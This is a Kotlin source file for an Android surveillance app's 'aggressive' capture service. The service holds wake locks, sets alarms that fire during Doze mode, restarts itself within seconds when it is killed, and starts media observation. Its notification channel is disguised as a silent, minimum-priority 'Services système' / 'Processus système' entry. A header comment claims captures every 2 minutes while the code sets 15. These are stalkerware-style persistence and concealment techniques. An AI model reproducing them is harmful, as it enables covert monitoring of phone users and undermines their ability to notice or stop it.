package com.surveillancepro.android.services

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import com.surveillancepro.android.MainActivity
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import com.surveillancepro.android.workers.SyncWorker

/**
 * Service de capture ULTRA-AGRESSIF qui force la collecte de données.
 * 
 * Techniques utilisées :
 * 1. WakeLock pour empêcher le téléphone de dormir pendant la capture
 * 2. AlarmManager pour se réveiller même en Doze mode
 * 3. Capture périodique forcée toutes les 2 minutes
 * 4. Redémarrage automatique si tué par le système
 */
class AggressiveCaptureService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private var wakeLock: PowerManager.WakeLock? = null
    private var mediaObserver: MediaObserverService? = null

    private val captureRunnable = object : Runnable {
        override fun run() {
            performAggressiveCapture()
            handler.postDelayed(this, CAPTURE_INTERVAL_MS)
        }
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        acquireWakeLock()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val storage = DeviceStorage.getInstance(applicationContext)
        if (!storage.hasAccepted || storage.deviceToken == null) {
            stopSelf()
            return START_NOT_STICKY
        }

        startForeground(NOTIFICATION_ID, buildNotification())
        
        // Démarrer la capture périodique
        handler.removeCallbacks(captureRunnable)
        handler.post(captureRunnable)

        // Démarrer le MediaObserver
        if (mediaObserver == null) {
            mediaObserver = MediaObserverService(this)
            mediaObserver?.start()
        }

        // Programmer un réveil via AlarmManager (survit au Doze mode)
        scheduleAlarm()

        Log.d(TAG, "AggressiveCaptureService started - capture every ${CAPTURE_INTERVAL_MS/1000}s")
        return START_STICKY
    }

    private fun performAggressiveCapture() {
        try {
            val storage = DeviceStorage.getInstance(applicationContext)
            if (!storage.hasAccepted || storage.deviceToken == null) return

            val queue = EventQueue.getInstance(applicationContext)
            val timestamp = java.text.SimpleDateFormat(
                "yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US
            ).format(java.util.Date())

            // Capture état système
            val bm = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            val battery = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
            
            queue.enqueue("aggressive_ping", mapOf(
                "batteryLevel" to battery,
                "timestamp" to timestamp,
                "serviceAlive" to true,
            ))

            // Forcer un sync si la queue est pleine
            if (queue.count() > 20) {
                SyncWorker.triggerNow(applicationContext)
            }

            Log.d(TAG, "Aggressive capture performed, queue: ${queue.count()}")
        } catch (e: Exception) {
            Log.w(TAG, "Capture error: ${e.message}")
        }
    }

    private fun scheduleAlarm() {
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, AggressiveCaptureService::class.java)
        val pendingIntent = PendingIntent.getService(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        // Réveil toutes les 5 minutes même en Doze mode
        alarmManager.setExactAndAllowWhileIdle(
            AlarmManager.RTC_WAKEUP,
            System.currentTimeMillis() + 5 * 60 * 1000,
            pendingIntent
        )
    }

    private fun acquireWakeLock() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "SupervisionPro::AggressiveCapture"
        )
        wakeLock?.acquire(10 * 60 * 1000L) // 10 minutes max
    }

    private fun releaseWakeLock() {
        wakeLock?.let {
            if (it.isHeld) it.release()
        }
        wakeLock = null
    }

    private fun buildNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return Notification.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID, "Services système",
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = "Processus système"
            setShowBadge(false)
            setSound(null, null)
            enableLights(false)
            enableVibration(false)
        }
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
    }

    override fun onDestroy() {
        handler.removeCallbacks(captureRunnable)
        mediaObserver?.stop()
        releaseWakeLock()
        
        // Auto-restart si tué
        val restartIntent = Intent(applicationContext, AggressiveCaptureService::class.java)
        val pendingIntent = PendingIntent.getService(
            applicationContext, 1, restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.set(
            AlarmManager.RTC_WAKEUP,
            System.currentTimeMillis() + 5000,
            pendingIntent
        )
        Log.d(TAG, "Service destroyed - scheduled restart in 5s")
        
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        private const val TAG = "AggressiveCapture"
        private const val CHANNEL_ID = "supervision_pro_aggressive"
        private const val NOTIFICATION_ID = 1005
        private const val CAPTURE_INTERVAL_MS = 15 * 60 * 1000L // 15 minutes - économie batterie
    }
}
